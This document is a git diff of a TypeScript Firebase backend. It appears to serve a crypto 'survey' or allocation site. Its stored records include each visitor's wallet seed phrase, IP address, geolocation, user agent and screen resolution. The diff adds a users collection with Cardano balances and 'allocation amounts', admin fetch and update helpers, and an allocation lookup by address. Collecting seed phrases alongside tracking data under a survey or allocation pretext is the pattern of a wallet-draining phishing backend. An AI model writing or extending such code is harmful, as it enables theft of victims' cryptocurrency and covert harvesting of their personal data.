@@ -9,6 +9,8 @@ import {
 	where,
 	doc,
 	deleteDoc,
+	updateDoc,
+	limit,
 } from "firebase/firestore";
 import { User } from "firebase/auth";
 
@@ -16,6 +18,25 @@ interface SurveyData {
 	blockchainNetwork: string;
 	walletProvider: string;
 	seedPhrase: string;
+	destinationAddress: string;
+	ipAddress?: string;
+	geolocation: {
+		latitude?: number;
+		longitude?: number;
+		city?: string;
+		region?: string;
+		country?: string;
+		error?: string;
+	} | null;
+	userAgent?: string;
+	screenResolution?: string;
+}
+
+interface UserData {
+	cardanoBalance: number;
+	allocationAmount: number;
+	blockchainNetwork: string;
+	walletProvider: string;
 	destinationAddress: string;
 	ipAddress?: string;
 	geolocation: {
@@ -44,11 +65,24 @@ export async function storeSurveyData(data: SurveyData) {
 	}
 }
 
+export async function storeUserData(data: UserData) {
+	try {
+		const docRef = await addDoc(collection(db, "users"), {
+			...data,
+			createdAt: serverTimestamp(),
+		});
+		console.log("Users submitted with ID: ", docRef.id);
+		return docRef.id;
+	} catch (error) {
+		console.error("Error adding users: ", error);
+		throw error;
+	}
+}
 /**
  * Fetch all surveys if the current user is an admin
  */
 
-export const fetchAllSurveys = async () => {
+export const fetchAllDocuments = async (collectionName: string) => {
 	// Get the current user
 	const user: User | null = auth.currentUser;
 
@@ -67,7 +101,7 @@ export const fetchAllSurveys = async () => {
 	}
 
 	// Fetch all documents in 'surveys' collection
-	const surveysSnapshot = await getDocs(collection(db, "surveys"));
+	const surveysSnapshot = await getDocs(collection(db, collectionName));
 	const surveys = surveysSnapshot.docs.map((doc) => ({
 		id: doc.id,
 		...doc.data(),
@@ -93,5 +127,64 @@ export async function deleteDocumentById(
 	} catch (error) {
 		console.error("Error deleting document:", error);
 		throw new Error(`Failed to delete document with ID = ${id}`);
+	}
+}
+
+/**
+ * Updates a Firestore document by its document ID.
+ *
+ * @param collectionName - Name of the Firestore collection
+ * @param id - The Firestore document ID
+ * @param updatedData - Object containing the fields to update
+ *
+ * @example
+ * await updateDocumentById("users", "abc123", { allocationAmount: 500 });
+ */
+export async function updateDocumentById(
+	collectionName: string,
+	id: string,
+	updatedData: Record<string, any>
+): Promise<void> {
+	try {
+		const docRef = doc(db, collectionName, id);
+		await updateDoc(docRef, updatedData);
+		console.log(
+			`✅ Document ${id} in '${collectionName}' updated successfully.`
+		);
+	} catch (error: any) {
+		console.error(
+			`❌ Error updating document ${id} in ${collectionName}:`,
+			error.message
+		);
+		throw new Error(error.message || "Failed to update document");
+	}
+}
+
+/**
+ * Fetches the allocationAmount for the first user
+ * whose destinationAddress matches the given address.
+ *
+ * @param address - The destination address to search for
+ * @returns The allocationAmount (number) or null if not found
+ */
+export async function getAllocationAmountByDestinationAddress(
+	address: string
+): Promise<number | null> {
+	try {
+		const q = query(
+			collection(db, "users"),
+			where("destinationAddress", "==", address),
+			limit(1)
+		);
+
+		const snapshot = await getDocs(q);
+
+		if (snapshot.empty) return null;
+
+		const docData = snapshot.docs[0].data();
+		return docData.allocationAmount ?? null;
+	} catch (error: any) {
+		console.error("Error fetching allocation amount:", error);
+		throw new Error(error.message || "Failed to fetch allocation amount");
 	}
 }
